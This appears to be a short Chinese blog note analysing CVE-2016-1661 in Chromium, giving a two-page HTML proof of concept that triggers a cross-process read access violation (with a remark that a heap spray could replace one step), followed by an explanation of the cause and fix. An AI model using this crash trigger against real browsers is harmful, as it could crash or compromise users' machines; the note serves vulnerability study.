---
layout: post
title: "CVE-2016-1661"
categories: notes
tags: CVE分析
---

```
https://bugs.chromium.org/p/chromium/issues/detail?id=601629
```

POC

```
// http://a.com/crash.html
<html>
<iframe id="iframe1" src="" style="display:none;"></iframe>
<button onclick='crash1();'>crash 1</button>

<script>

function crash1(){

//open window a in another renderer process.
a=window.open();
a.opener=null;
a.location.href="http://b.com/redirection.html";

//loading an iframe. This can be replaced by a heap spray.
document.getElementById("iframe1").src="anything.com";

//reading a.location after a while will cause a read access violation. 
setTimeout(function(){ 
alert(a.location) // crash
}, 3000);
}

</script>

</html>

// http://b.com/redirection.html

<script>

if(window.location=="http://b.com/redirection.html"){  

//redirect to 127.0.1.1
window.location="http://a.com/anything.html";

}

</script>

```

### 原因

chromium渲染页面时，通过[一定的规则](https://www.chromium.org/developers/design-documents/process-models#Caveats)，会导致在不同的进程中渲染同一站点的页面。

由于同源策略允许，那么不同网站渲染的A页面和B页面理应能够相互读取。但是由于二者在不同进程，读取对象时，只能读取当前进程的地址空间，这就导致了非法读。

chromium的修复方式为限定不同进程的窗口的页面之间不同源(其实和同源策略的理念相悖了)。

具体修复代码不贴了，就是判断了下targetFrame是否本地窗口。





